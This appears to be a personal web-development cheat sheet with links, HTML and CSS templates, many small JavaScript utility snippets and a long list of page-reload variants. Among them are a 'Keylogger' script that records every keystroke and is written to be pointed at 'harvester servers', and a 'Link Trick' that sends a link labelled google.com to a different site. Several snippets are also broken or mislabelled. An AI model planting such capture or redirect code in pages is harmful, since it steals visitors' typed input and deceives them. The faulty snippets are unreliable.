# Basics

Libraries

- <https://htmx.org/>
- <https://htmlboilerplates.com/>

## Standards

Status Codes

- <https://statuses.now.sh/>
- <https://httpstatuses.com/>
- <https://http.cat/>

Example Text and Pictures

- <https://picsum.photos/>
- <https://www.loremipsum.de/>
- <https://lipsum.com/>

Other:

- Browser Standards: <https://browseraudit.com>
- SSL Settings <https://ssl-config.mozilla.org/>
- Security.txt <https://securitytxt.org/>
- Web Manifest <https://www.pwabuilder.com/generate>

## Encypt Static Page

How to encypt a static page with [staticrypt](https://github.com/robinmoisson/staticrypt)

``` sh
npx staticrypt index.html password
```

## HTML

``` txt
  ##  ##  ######  ##   ##  ##
  ##  ##    ##    ### ###  ##
  ######    ##    ## # ##  ##
  ##  ##    ##    ##   ##  ##
  ##  ##    ##    ##   ##  ######
(((((((((((((((((((((((((((((((((((
(((((((((((((((((/////////////(((((
(((((((((((((((((/////////////(((((
(((((((                     //(((((
 ((((((                     //((((
 ((((((    ((((((/////////////((((
 ((((((     (((((/////////////((((
 ((((((                    ///((((
  (((((                    ///(((
  (((((((((((((((//////    ///(((
  ((((((    (((((/////     ///(((
  ((((((                   ///(((
   (((((((               /////((
   ((((((((((((((/////////////((
   ((((((((((((((//////(((((((((
          (((((((((((((((
```

### Show Base64 Images

``` html
<img src="data:image/png;base64,<Base64codehere>"/>
```

### Link Trick

``` html
<!doctype html>
<head>
<script>
  function tricked() {
    document.getElementById("naughty").href="http://www.bad.org";
  }
</script>
</head>
<body>
  <a href="http://www.google.com" onclick="tricked()" id="naughty">www.google.com</a>
</body>
```

### Empty HTML File Template

``` html
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <title>Minimal base.html</title>
</head>
<body>

</body>
</html>
```

### Data list

``` HTML
<label for="input">Search for a word:</label>
<input list="datalist" id="input" name="example" />
<datalist id="datalist">
  <option value="type">
  <option value="random">
  <option value="words">
  <option value="in">
  <option value="the">
  <option value="input">
</datalist>
```

### Example 404s

Great examples from other pages.

#### Financial Times

[Financial Times 404 Error page](https://www.ft.com/0xfab1):

Why wasn't this page found?

We asked some leading economists.

- Stagflation: The cost of pages rose drastically, while the page production rate slowed down.
- General economics: There was no market for it.
- Liquidity traps: We injected some extra money into the technology team but there was little or no interest so they simply kept it, thus failing to stimulate the page economy.
- Pareto inefficiency: There exists another page that will make everyone better off without making anyone worse off.
- Supply and demand: Demand increased and a shortage occurred.
- Classical economics: There is no such page. We are not going to interfere.
- Keynesian economics: Aggregate demand for this page did not necessarily equal the productive capacity of the website.
- Malthusianism: Unchecked, exponential page growth outstripped the pixel supply. There was a catastrophe, and now the population is at a lower, more sustainable level.
- Neo-Malthusianism: To avoid unchecked, exponential page growth outstripping the pixel supply and leading to an inevitable catastrophe, we prevented this page from being conceived.
- Marxism: The failure of this page to load is a consequence of the inherent contradictions in the capitalist mode of production.
- Laissez Faire Capitalism: We know this page is needed, but we can't force anyone to make it.
- Monetarism: The government has limited the number of pages in circulation.
- Efficient Markets Hypothesis: If you had paid enough for the page, it would have appeared.
- Moral Hazard: Showing you this page would only encourage you to want more pages.
- Tragedy of the Commons: Everyone wanted to view this page, but no-one was willing to maintain it.
- Game theory: By not viewing this page you help everyone else get better pages.
- Mercantilism: The page is hosted by a foreign web server and is therefore banned to ensure the supremacy of our own software.
- Trickle-down: High taxes on content publishers prevented them hiring the person who would have written this page.
- Speculative bubble: The page never actually existed and was fundamentally impossible, but everyone bought into it in a frenzy and it's all now ending in tears.
- Socialism: If you were to get the page you wanted you might get a better page than someone else, which would be unfair. This way at least everyone gets the same.
- Behavioural economics: The influence of psychological factors caused you to act in a manner that would not be expected of a purely rational actor.
- Theory of the second best: The best outcome was unachievable, so you have arrived here instead.

## CSS

``` txt
        ####    ####    ####
       ##  ##  ##      ##
       ##       ####    ####
       ##  ##      ##      ##
        ####    ####    ####
(((((((((((((((((((((((((((((((((((
(((((((((((((((((/////////////(((((
(((((((((((((((((/////////////(((((
(((((((                    ///(((((
 ((((((                    ///((((
 ((((((((((((((((        /////((((
 (((((((((((        //////////((((
 (((((((                   ///((((
  ((((((                   ///(((
  (((((((((((((((//////    ///(((
  (((((((    ((((//////    ///(((
  (((((((                  ///(((
   (((((((               /////((
   ((((((((((((((/////////////((
   ((((((((((((((//////(((((((((
          (((((((((((((((
```

### Links

Lern CSS

- <https://web.dev/learn/css/>

CSS Tools

- <http://www.patternify.com/>
- <http://css3generator.com/>
- <https://3dbook.xyz/>
- <https://spritegen.website-performance.org/>

CSS Templates

- NES <https://nostalgic-css.github.io/NES.css/>
- Windows 98 <https://jdan.github.io/98.css/>
- Windows XP <https://botoxparty.github.io/XP.css/>
- Windows 7 <https://khang-nd.github.io/7.css/>
- Windows 10 <https://github.com/jianzhongli/csswin10>
- BOOTSTRA.386 <http://kristopolous.github.io/BOOTSTRA.386/>
- Text-based user interface <https://github.com/vinibiavatti1/TuiCss>
- Mac OS 8.1 <https://github.com/npjg/classic.css>
- Amiga Workbench <https://github.com/renkman/Renkbench>
- AnderShell 3000 <https://github.com/andersevenrud/retro-css-shell-demo>
- Paper <https://www.getpapercss.com/>
- LaTeX <https://latex.now.sh/>
- Commodore 64 <http://pixelambacht.nl/2013/css3-c64/>
- Old Internet <https://code.divshot.com/geo-bootstrap/>

Lists of others

- sw-yx spark-joy <https://github.com/sw-yx/spark-joy>

### CSS Examples

CSS reset template ([source](https://www.joshwcomeau.com/css/custom-css-reset/)). What it does:

- Use a more-intuitive box-sizing model
- Remove default margin
- Allow percentage-based heights in the application
- Add accessible line-height
- Improve text rendering
- Improve media defaults
- Remove built-in form typography styles
- Avoid text overflows
- Create a root stacking context

Code:

```css
*, *::before, *::after {
  box-sizing: border-box;
}

* {
  margin: 0;
}

html, body {
  height: 100%;
}

body {
  line-height: 1.5;
  -webkit-font-smoothing: antialiased;
}

img, picture, video, canvas, svg {
  display: block;
  max-width: 100%;
}

input, button, textarea, select {
  font: inherit;
}

p, h1, h2, h3, h4, h5, h6 {
  overflow-wrap: break-word;
}

#root, #__next {
  isolation: isolate;
}
```

ASCII Boarder

``` html
<div class="broider"><br/></div>
```

``` css
.broider {
    border-image:  url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFQAAABUCAYAAAAcaxDBAAAC4UlEQVR4Xu2cQXLjMAwE4/fllofm5vcllaOoqnS1B5KtZPa2S5AEmgOQouS9vS1/3j/ev9Z/m/z7/fN+S8Yj/9LxLY91vl1w5HAC46dvGjD5l45foAuBApWSf3mFrg4evcJ2fOuftacUJ3/X+W6pAySwdHzb39oXKJwSChQkbgFZ+8srlEoEtduaRvYF2pSfffIixTXlKcflwf3pQKmGyHi1+bTi6OBvHbT+nf4svwZkHbb2FmDqX4ECcbuABXo0UEoRW/SpplkFkH/Ubuez9vqyt0C3S7a7HKEVpVOAXcG06Ft/0/lsfFXoQjzNwMsBJcVMZxTNd/mUpwAL9MUvO2gBq9DhBRwHanfddcXTcyrNT+NTf9seb0p2wgKFY0WBbglUoVYRYD9+OUK74rD/eri0plJ8BSqXpEAP3gPW9ahCpxVqLwPSRzvpf2x+dnzxt02pwzExGCD1z/Yv0OEFKdACdUXCpmy6R1ShVWgV6ggMW5+e8lQz0vjoUS0d3/ZPn+XX+U7/nVKBDv+SrkALVFURTHmqqVZx6aagonvAOPVPv6SbntAuyAOMVJfp+PAVyPSEBbrUVAskXRAltweMU/+a8nCDnwqmKT+cgQVaoA8Uyl+6PL2G2nBsTbLjp/bps318sLcBFCjsggW6JVCFHiyY3SsQq0Brn5YAqnn2c0ny3/pboEC0QJdPvknRVSjc175cypPE7UHY2qf3saTI6fhWf/V7eQvI2hfo8M9UCrRANxo4PeVpV6V2WwPpPXqaEU+voQSM2gv05NfS/26XJwVS+59XKAGgdgvI2tP8afvutsmeEymlrIMWkLW3/lj7ArXE5OVJfGxK/bOKs/apf9R/XKEUYHrOO7vEEECKJ1ZogW7/O88CtZJc7Hef4qS7fBV6cYUevYBWsJdXaIFCzSFAtiTRLkzzVaFAIF0QAozfh9K57+gVtveXNmCyt+345UiBOqQF6nihdYEiImewAv0GkuAMuOoLGeUAAAAASUVORK5CYII=") 28 /  28px / 0 round;
    border-width:  28px;
    border-style:  solid;
}
```

## JavaScript

![javascript](_javascript.webp)

## Cool JS libraries

- d3.js: <https://threejs.org/>
- three.js: <https://d3js.org/>

### Keylogger

``` js
(() => {
  let buffer = []
  let limit  = 1024
  let start  = Date.now()

  let timeout = null
  let delay   = 1500

  let feast = (payload) => {
    // Replace this with a POST to your harvester servers.
    console.log(payload)
  }

  let harvest = () => {
    let end     = Date.now()
    let payload = {c: buffer, s: start, e: end}

    feast(payload)

    buffer = []
    start  = Date.now()
  }

  document.addEventListener('keydown', (event) => {
    let key   = event.key || event.keyCode;
    let entry = {k: key, t: Date.now()}

    buffer.push(entry)
    if (buffer.length >= limit) { harvest() }

    clearTimeout(timeout)
    timeout = setTimeout(() => { harvest() }, delay);
  })
})()
```

### Viewport

Set viewport based on mobile or desktop

``` js
var viewMode = getCookie("view-mode");
if(viewMode == "desktop"){
    viewport.setAttribute('content', 'width=1024');
}else if (viewMode == "mobile"){
    viewport.setAttribute('content', 'width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no');
}
```

### Integer Stuff

#### Greatest common divisor (GCD)

Base case is when `y` equals `0`. In this case, return `x`.
Otherwise, return the GCD of `y` and the remainder of the division `x/y`.

```js
var gcd = (x , y) => !y ? x : gcd(y, x % y);
```

#### Even or odd number

Use `Math.abs()` to extend logic to negative numbers, check using the modulo (`%`) operator.
Return `true` if the number is even, `false` if the number is odd.

```js
var isEven = num => Math.abs(num) % 2 === 0;
```

### String manipulation

#### Sort characters in string (alphabetical)

Split the string using `split('')`, `sort()` utilizing `localeCompare()`, recombine using `join('')`.

```js
var sortCharactersInString = str =>
  str.split('').sort( (a,b) => a.localeCompare(b) ).join('');
```

#### Capitalize first letter

Use `toUpperCase()` to capitalize first letter, `slice(1)` to get the rest of the string.

```js
var capitalize = str => str[0].toUpperCase() + str.slice(1);
```

#### Anagrams of string (with duplicates)

Use recursion.
For each letter in the given string, create all the partial anagrams for the rest of its letters.
Use `map()` to combine the letter with each partial anagram, then `reduce()` to combine all anagrams in one array.
Base cases are for string `length` equal to `2` or `1`.

```js
var anagrams = s => {
  if(s.length <= 2)  return s.length === 2 ? [s, s[1] + s[0]] : [s];
  return s.split('').reduce( (a,l,i) => {
    anagrams(s.slice(0,i) + s.slice(i+1)).map( v => a.push(l+v) );
    return a;
  }, []);
}
```

#### Escape regular expression

Use `replace()` to escape special characters.

```js
var escapeRegExp = s =>
  s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
```

### Arrays

#### Filter out non-unique values in an array

Use `Array.filter()` for an array containing only the unique values.

```js
const unique = arr => arr.filter(i => arr.indexOf(i) === arr.lastIndexOf(i));
// unique([1,2,2,3,4,4,5]) → [1,3,5]
```

#### Flatten array

Use `reduce()` to get all elements that are not arrays, flatten each element that is an array.

```js
var flatten = arr =>
  arr.reduce( (a, v) => a.concat( Array.isArray(v) ? flatten(v) : v ), []);
```

#### Average of array of numbers

Use `reduce()` to add each value to an accumulator, initialized with a value of `0`, divide by the `length` of the array.

```js
var average = arr =>
  arr.reduce( (acc , val) => acc + val, 0) / arr.length;
```

#### Count occurrences of a value in array

Use `filter()` to create an array containing only the items with the specified value, count them using `length`.

```js
var countOccurrences = (arr, value) => arr.filter(v => v === value).length;
```

#### Difference between arrays

Use `filter()` to remove values that are part of `values`, determined using `indexOf()`.

```js
var difference = (arr, values) =>
  arr.filter(v => values.indexOf(v) === -1);
```

#### Return last of list

Return `arr.slice(-1)[0]`.

```js
var initial = arr => arr.slice(-1)[0];
```

#### Return first of list

Return `arr.slice(0,-1)`.

```js
var initial = arr => arr.slice(0,-1);
```

#### Similarity between arrays

Use `filter()` to remove values that are not part of `values`, determined using `indexOf()`.

```js
var difference = (arr, values) =>
  arr.filter(v => values.indexOf(v) !== -1);
```

#### Powerset

Use `reduce()` combined with `map()` to iterate over elements and combine into an array containing all combinations.

```js
var powerset = arr =>
  arr.reduce( (a,v) => a.concat(a.map( r => [v].concat(r) )), [[]]);
```

#### Unique values of array

Use ES6 `Set` and the `...rest` operator to discard all duplicated values.

```js
const unique = arr => [...new Set(arr)];
// unique([1,2,2,3,4,4,5]) → [1,2,3,4,5]
```

#### Sum of array of numbers

Use `reduce()` to add each value to an accumulator, initialized with a value of `0`.

```js
var sum = arr =>
  arr.reduce( (acc , val) => acc + val, 0);
```

#### Factorial

Create an array of length `n+1`, use `reduce()` to get the product of every value in the given range, utilizing the index of each element.

```js
var factorial = n =>
  Array.apply(null, [1].concat(Array(n))).reduce( (a, _, i) => a * i || 1 , 1);
```

### Loops

#### Recursion

If the number of provided arguments (`args`) is sufficient, call the passed function `f`.
Otherwise return a curried function `f` that expects the rest of the arguments.

```js
var curry = f =>
  (...args) =>
    args.length >= f.length ? f(...args) : (...otherArgs) => curry(f)(...args, ...otherArgs)
```

### Functions

#### Measure time taken by function

Use `performance.now()` to get start and end time for the function, `console.log()` the time taken.
First argument is the function name, subsequent arguments are passed to the function.

```js
var timeTaken = (f,...args) => {
  var t0 = performance.now(), r = f(...args);
  console.log(performance.now() - t0);
  return r;
}
```

### Graphics

#### RGB to hexadecimal

Convert each value to a hexadecimal string, using `toString(16)`, then `padStart(2,'0')` to get a 2-digit hexadecimal value.
Combine values using `join('')`.

```js
var rgbToHex = (r, g, b) =>
  [r,g,b].map( v => v.toString(16).padStart(2,'0')).join('');
```

### Randomize

#### Randomize order of array

Use `sort()` to reorder elements, utilizing `Math.random()` to randomize the sorting.

```js
var randomizeOrder = arr => arr.sort( (a,b) => Math.random() >= 0.5 ? -1 : 1)
```

#### Random number in range

Use `Math.random()` to generate a random value, map it to the desired range using multiplication.

```js
var randomInRange = (min, max) => Math.random() * (max - min) + min;
```

#### UUID generator

Use `crypto` API to generate a UUID, compliant with [RFC4122](https://www.ietf.org/rfc/rfc4122.txt) version 4.

```js
var uuid = _ =>
  ( [1e7]+-1e3+-4e3+-8e3+-1e11 ).replace( /[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
  )
```

### Manipulate Web Page

#### URL parameters

Use `match()` with an appropriate regular expression to get all key-value pairs, `map()` them appropriately.
Combine all key-value pairs into a single object using `Object.assign()` and the spread operator (`...`).
Pass `location.search` as the argument to apply to the current `url`.

```js
var getUrlParameters = url =>
  Object.assign(...url.match(/([^?=&]+)(=([^&]*))?/g).map(m => {[f,v] = m.split('='); return {[f]:v}}));
```

### Scroll to top

Get distance from top using `document.documentElement.scrollTop` or `document.body.scrollTop`.
Scroll by a fraction of the distance from top. Use `window.requestFrame()` to animate the scrolling.

```js
var scrollToTop = _ => {
  var c = document.documentElement.scrollTop || document.body.scrollTop;
  if(c > 0) {
    window.requestAnimationFrame(scrollToTop);
    window.scrollTo(0, c - c/8);
  }
}
```

## Random unsorted

prefix an integer with zeros

```js
function PrefixInteger(num, length) {

return (Array(length).join('0') + num).slice(-length);
}
```

String converter

```js
function CreateTranslator(translationTable) function(s) s.replace(new RegExp([k for (k in translationTable)].join('|'), 'g'), function(str) translationTable[str]);

var translationTable = { a:1, bb:2, b:3, c:4 };
var MyTranslater = CreateTranslator( translationTable );
MyTranslater('aabbbc'); // returns: 11234
```

### Brainfuck interpreter

```js
var code = '++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.&lt;&lt;+++++++++++++++.>.+++.------.--------.>+.>.';
var inp = '23\\n';
var out = '';

var codeSize = code.length;
var i = 0, ip = 0, cp = 0, dp = 0, m = {};

var loopIn = {}, loopOut = {};
var tmp = \[];
for ( var cp = 0; cp &lt; codeSize ; cp++ )
if ( code[cp] == '\[' )
        tmp.push(cp);
else
if ( code[cp] == ']' )
            loopOut\[loopIn[cp] = tmp.pop()] = cp;

for (var cp = 0; cp &lt; codeSize && i &lt; 100000; cp++, i++) {

switch(code[cp]) {

case '>': dp++; break;
case '&lt;': dp--; break;
case '+': m[dp] = ((m[dp]||0)+1)&255; break
case '-': m[dp] = ((m[dp]||0)-1)&255; break;
case '.': out += String.fromCharCode(m[dp]); break;
case ',': m[dp] = inp.charCodeAt(ip++)||0; break;
case '\[': m[dp]||(cp=loopOut[cp]); break;
case ']': cp = loopIn[cp]-1; break;
}
}
Print(out);
```

## Add page to favorites

```js
function pageToolsBookmark() {
  bkmkurl= document.URL;
  bkmktitle= document.title;
  if (document.all) {
    window.external.AddFavorite(bkmkurl,bkmktitle);
  } else {
    alert("Please use Control + D to set a bookmark for this page");
  }
}
```

### Escape and unescape HTML entities

```js
const entityToCode = { **proto**: null,
apos:0x0027,quot:0x0022,amp:0x0026,lt:0x003C,gt:0x003E,nbsp:0x00A0,iexcl:0x00A1,cent:0x00A2,pound:0x00A3,
curren:0x00A4,yen:0x00A5,brvbar:0x00A6,sect:0x00A7,uml:0x00A8,copy:0x00A9,ordf:0x00AA,laquo:0x00AB,
not:0x00AC,shy:0x00AD,reg:0x00AE,macr:0x00AF,deg:0x00B0,plusmn:0x00B1,sup2:0x00B2,sup3:0x00B3,
acute:0x00B4,micro:0x00B5,para:0x00B6,middot:0x00B7,cedil:0x00B8,sup1:0x00B9,ordm:0x00BA,raquo:0x00BB,
frac14:0x00BC,frac12:0x00BD,frac34:0x00BE,iquest:0x00BF,Agrave:0x00C0,Aacute:0x00C1,Acirc:0x00C2,Atilde:0x00C3,
Auml:0x00C4,Aring:0x00C5,AElig:0x00C6,Ccedil:0x00C7,Egrave:0x00C8,Eacute:0x00C9,Ecirc:0x00CA,Euml:0x00CB,
Igrave:0x00CC,Iacute:0x00CD,Icirc:0x00CE,Iuml:0x00CF,ETH:0x00D0,Ntilde:0x00D1,Ograve:0x00D2,Oacute:0x00D3,
Ocirc:0x00D4,Otilde:0x00D5,Ouml:0x00D6,times:0x00D7,Oslash:0x00D8,Ugrave:0x00D9,Uacute:0x00DA,Ucirc:0x00DB,
Uuml:0x00DC,Yacute:0x00DD,THORN:0x00DE,szlig:0x00DF,agrave:0x00E0,aacute:0x00E1,acirc:0x00E2,atilde:0x00E3,
auml:0x00E4,aring:0x00E5,aelig:0x00E6,ccedil:0x00E7,egrave:0x00E8,eacute:0x00E9,ecirc:0x00EA,euml:0x00EB,
igrave:0x00EC,iacute:0x00ED,icirc:0x00EE,iuml:0x00EF,eth:0x00F0,ntilde:0x00F1,ograve:0x00F2,oacute:0x00F3,
ocirc:0x00F4,otilde:0x00F5,ouml:0x00F6,divide:0x00F7,oslash:0x00F8,ugrave:0x00F9,uacute:0x00FA,ucirc:0x00FB,
uuml:0x00FC,yacute:0x00FD,thorn:0x00FE,yuml:0x00FF,OElig:0x0152,oelig:0x0153,Scaron:0x0160,scaron:0x0161,
Yuml:0x0178,fnof:0x0192,circ:0x02C6,tilde:0x02DC,Alpha:0x0391,Beta:0x0392,Gamma:0x0393,Delta:0x0394,
Epsilon:0x0395,Zeta:0x0396,Eta:0x0397,Theta:0x0398,Iota:0x0399,Kappa:0x039A,Lambda:0x039B,Mu:0x039C,
Nu:0x039D,Xi:0x039E,Omicron:0x039F,Pi:0x03A0,Rho:0x03A1,Sigma:0x03A3,Tau:0x03A4,Upsilon:0x03A5,
Phi:0x03A6,Chi:0x03A7,Psi:0x03A8,Omega:0x03A9,alpha:0x03B1,beta:0x03B2,gamma:0x03B3,delta:0x03B4,
epsilon:0x03B5,zeta:0x03B6,eta:0x03B7,theta:0x03B8,iota:0x03B9,kappa:0x03BA,lambda:0x03BB,mu:0x03BC,
nu:0x03BD,xi:0x03BE,omicron:0x03BF,pi:0x03C0,rho:0x03C1,sigmaf:0x03C2,sigma:0x03C3,tau:0x03C4,
upsilon:0x03C5,phi:0x03C6,chi:0x03C7,psi:0x03C8,omega:0x03C9,thetasym:0x03D1,upsih:0x03D2,piv:0x03D6,
ensp:0x2002,emsp:0x2003,thinsp:0x2009,zwnj:0x200C,zwj:0x200D,lrm:0x200E,rlm:0x200F,ndash:0x2013,
mdash:0x2014,lsquo:0x2018,rsquo:0x2019,sbquo:0x201A,ldquo:0x201C,rdquo:0x201D,bdquo:0x201E,dagger:0x2020,
Dagger:0x2021,bull:0x2022,hellip:0x2026,permil:0x2030,prime:0x2032,Prime:0x2033,lsaquo:0x2039,rsaquo:0x203A,
oline:0x203E,frasl:0x2044,euro:0x20AC,image:0x2111,weierp:0x2118,real:0x211C,trade:0x2122,alefsym:0x2135,
larr:0x2190,uarr:0x2191,rarr:0x2192,darr:0x2193,harr:0x2194,crarr:0x21B5,lArr:0x21D0,uArr:0x21D1,
rArr:0x21D2,dArr:0x21D3,hArr:0x21D4,forall:0x2200,part:0x2202,exist:0x2203,empty:0x2205,nabla:0x2207,
isin:0x2208,notin:0x2209,ni:0x220B,prod:0x220F,sum:0x2211,minus:0x2212,lowast:0x2217,radic:0x221A,
prop:0x221D,infin:0x221E,ang:0x2220,and:0x2227,or:0x2228,cap:0x2229,cup:0x222A,int:0x222B,
there4:0x2234,sim:0x223C,cong:0x2245,asymp:0x2248,ne:0x2260,equiv:0x2261,le:0x2264,ge:0x2265,
sub:0x2282,sup:0x2283,nsub:0x2284,sube:0x2286,supe:0x2287,oplus:0x2295,otimes:0x2297,perp:0x22A5,
sdot:0x22C5,lceil:0x2308,rceil:0x2309,lfloor:0x230A,rfloor:0x230B,lang:0x2329,rang:0x232A,loz:0x25CA,
spades:0x2660,clubs:0x2663,hearts:0x2665,diams:0x2666
};

var charToEntity = {};
for ( var entityName in entityToCode )
        charToEntity\[String.fromCharCode(entityToCode[entityName])] = entityName;

function UnescapeEntities(str) str.replace(/&(.+?);/g, function(str, ent) String.fromCharCode( ent[0]!='#' ? entityToCode[ent] &#x3A; ent[1]=='x' ? parseInt(ent.substr(2),16): parseInt(ent.substr(1)) ) );

function EscapeEntities(str) str.replace(/[^\x20-\x7E]/g, function(str) charToEntity[str] ? '&'+charToEntity[str]+';' : str );
```

### 534 ways to reload the page with JavaScript

```js
- location = location
- location = location.href
- location = window.location
- location = self.location
- location = window.location.href
- location = self.location.href
- location = location['href']
- location = window['location']
- location = window['location'].href
- location = window['location']['href']
- location = window.location['href']
- location = self['location']
- location = self['location'].href
- location = self['location']['href']
- location = self.location['href']
- location.assign(location)
- location.replace(location)
- window.location.assign(location)
- window.location.replace(location)
- self.location.assign(location)
- self.location.replace(location)
- location['assign'](location)
- location['replace'](location)
- window.location['assign'](location)
- window.location['replace'](location)
- window['location'].assign(location)
- window['location'].replace(location)
- window['location']['assign'](location)
- window['location']['replace'](location)
- self.location['assign'](location)
- self.location['replace'](location)
- self['location'].assign(location)
- self['location'].replace(location)
- self['location']['assign'](location)
- self['location']['replace'](location)
- location.href = location
- location.href = location.href
- location.href = window.location
- location.href = self.location
- location.href = window.location.href
- location.href = self.location.href
- location.href = location['href']
- location.href = window['location']
- location.href = window['location'].href
- location.href = window['location']['href']
- location.href = window.location['href']
- location.href = self['location']
- location.href = self['location'].href
- location.href = self['location']['href']
- location.href = self.location['href']
- location.assign(location.href)
- location.replace(location.href)
- window.location.assign(location.href)
- window.location.replace(location.href)
- self.location.assign(location.href)
- self.location.replace(location.href)
- location['assign'](location.href)
- location['replace'](location.href)
- window.location['assign'](location.href)
- window.location['replace'](location.href)
- window['location'].assign(location.href)
- window['location'].replace(location.href)
- window['location']['assign'](location.href)
- window['location']['replace'](location.href)
- self.location['assign'](location.href)
- self.location['replace'](location.href)
- self['location'].assign(location.href)
- self['location'].replace(location.href)
- self['location']['assign'](location.href)
- self['location']['replace'](location.href)
- window.location = location
- window.location = location.href
- window.location = window.location
- window.location = self.location
- window.location = window.location.href
- window.location = self.location.href
- window.location = location['href']
- window.location = window['location']
- window.location = window['location'].href
- window.location = window['location']['href']
- window.location = window.location['href']
- window.location = self['location']
- window.location = self['location'].href
- window.location = self['location']['href']
- window.location = self.location['href']
- location.assign(window.location)
- location.replace(window.location)
- window.location.assign(window.location)
- window.location.replace(window.location)
- self.location.assign(window.location)
- self.location.replace(window.location)
- location['assign'](window.location)
- location['replace'](window.location)
- window.location['assign'](window.location)
- window.location['replace'](window.location)
- window['location'].assign(window.location)
- window['location'].replace(window.location)
- window['location']['assign'](window.location)
- window['location']['replace'](window.location)
- self.location['assign'](window.location)
- self.location['replace'](window.location)
- self['location'].assign(window.location)
- self['location'].replace(window.location)
- self['location']['assign'](window.location)
- self['location']['replace'](window.location)
- self.location = location
- self.location = location.href
- self.location = window.location
- self.location = self.location
- self.location = window.location.href
- self.location = self.location.href
- self.location = location['href']
- self.location = window['location']
- self.location = window['location'].href
- self.location = window['location']['href']
- self.location = window.location['href']
- self.location = self['location']
- self.location = self['location'].href
- self.location = self['location']['href']
- self.location = self.location['href']
- location.assign(self.location)
- location.replace(self.location)
- window.location.assign(self.location)
- window.location.replace(self.location)
- self.location.assign(self.location)
- self.location.replace(self.location)
- location['assign'](self.location)
- location['replace'](self.location)
- window.location['assign'](self.location)
- window.location['replace'](self.location)
- window['location'].assign(self.location)
- window['location'].replace(self.location)
- window['location']['assign'](self.location)
- window['location']['replace'](self.location)
- self.location['assign'](self.location)
- self.location['replace'](self.location)
- self['location'].assign(self.location)
- self['location'].replace(self.location)
- self['location']['assign'](self.location)
- self['location']['replace'](self.location)
- window.location.href = location
- window.location.href = location.href
- window.location.href = window.location
- window.location.href = self.location
- window.location.href = window.location.href
- window.location.href = self.location.href
- window.location.href = location['href']
- window.location.href = window['location']
- window.location.href = window['location'].href
- window.location.href = window['location']['href']
- window.location.href = window.location['href']
- window.location.href = self['location']
- window.location.href = self['location'].href
- window.location.href = self['location']['href']
- window.location.href = self.location['href']
- location.assign(window.location.href)
- location.replace(window.location.href)
- window.location.assign(window.location.href)
- window.location.replace(window.location.href)
- self.location.assign(window.location.href)
- self.location.replace(window.location.href)
- location['assign'](window.location.href)
- location['replace'](window.location.href)
- window.location['assign'](window.location.href)
- window.location['replace'](window.location.href)
- window['location'].assign(window.location.href)
- window['location'].replace(window.location.href)
- window['location']['assign'](window.location.href)
- window['location']['replace'](window.location.href)
- self.location['assign'](window.location.href)
- self.location['replace'](window.location.href)
- self['location'].assign(window.location.href)
- self['location'].replace(window.location.href)
- self['location']['assign'](window.location.href)
- self['location']['replace'](window.location.href)
- self.location.href = location
- self.location.href = location.href
- self.location.href = window.location
- self.location.href = self.location
- self.location.href = window.location.href
- self.location.href = self.location.href
- self.location.href = location['href']
- self.location.href = window['location']
- self.location.href = window['location'].href
- self.location.href = window['location']['href']
- self.location.href = window.location['href']
- self.location.href = self['location']
- self.location.href = self['location'].href
- self.location.href = self['location']['href']
- self.location.href = self.location['href']
- location.assign(self.location.href)
- location.replace(self.location.href)
- window.location.assign(self.location.href)
- window.location.replace(self.location.href)
- self.location.assign(self.location.href)
- self.location.replace(self.location.href)
- location['assign'](self.location.href)
- location['replace'](self.location.href)
- window.location['assign'](self.location.href)
- window.location['replace'](self.location.href)
- window['location'].assign(self.location.href)
- window['location'].replace(self.location.href)
- window['location']['assign'](self.location.href)
- window['location']['replace'](self.location.href)
- self.location['assign'](self.location.href)
- self.location['replace'](self.location.href)
- self['location'].assign(self.location.href)
- self['location'].replace(self.location.href)
- self['location']['assign'](self.location.href)
- self['location']['replace'](self.location.href)
- location['href'] = location
- location['href'] = location.href
- location['href'] = window.location
- location['href'] = self.location
- location['href'] = window.location.href
- location['href'] = self.location.href
- location['href'] = location['href']
- location['href'] = window['location']
- location['href'] = window['location'].href
- location['href'] = window['location']['href']
- location['href'] = window.location['href']
- location['href'] = self['location']
- location['href'] = self['location'].href
- location['href'] = self['location']['href']
- location['href'] = self.location['href']
- location.assign(location['href'])
- location.replace(location['href'])
- window.location.assign(location['href'])
- window.location.replace(location['href'])
- self.location.assign(location['href'])
- self.location.replace(location['href'])
- location['assign'](location['href'])
- location['replace'](location['href'])
- window.location['assign'](location['href'])
- window.location['replace'](location['href'])
- window['location'].assign(location['href'])
- window['location'].replace(location['href'])
- window['location']['assign'](location['href'])
- window['location']['replace'](location['href'])
- self.location['assign'](location['href'])
- self.location['replace'](location['href'])
- self['location'].assign(location['href'])
- self['location'].replace(location['href'])
- self['location']['assign'](location['href'])
- self['location']['replace'](location['href'])
- window['location'] = location
- window['location'] = location.href
- window['location'] = window.location
- window['location'] = self.location
- window['location'] = window.location.href
- window['location'] = self.location.href
- window['location'] = location['href']
- window['location'] = window['location']
- window['location'] = window['location'].href
- window['location'] = window['location']['href']
- window['location'] = window.location['href']
- window['location'] = self['location']
- window['location'] = self['location'].href
- window['location'] = self['location']['href']
- window['location'] = self.location['href']
- location.assign(window['location'])
- location.replace(window['location'])
- window.location.assign(window['location'])
- window.location.replace(window['location'])
- self.location.assign(window['location'])
- self.location.replace(window['location'])
- location['assign'](window['location'])
- location['replace'](window['location'])
- window.location['assign'](window['location'])
- window.location['replace'](window['location'])
- window['location'].assign(window['location'])
- window['location'].replace(window['location'])
- window['location']['assign'](window['location'])
- window['location']['replace'](window['location'])
- self.location['assign'](window['location'])
- self.location['replace'](window['location'])
- self['location'].assign(window['location'])
- self['location'].replace(window['location'])
- self['location']['assign'](window['location'])
- self['location']['replace'](window['location'])
- window['location'].href = location
- window['location'].href = location.href
- window['location'].href = window.location
- window['location'].href = self.location
- window['location'].href = window.location.href
- window['location'].href = self.location.href
- window['location'].href = location['href']
- window['location'].href = window['location']
- window['location'].href = window['location'].href
- window['location'].href = window['location']['href']
- window['location'].href = window.location['href']
- window['location'].href = self['location']
- window['location'].href = self['location'].href
- window['location'].href = self['location']['href']
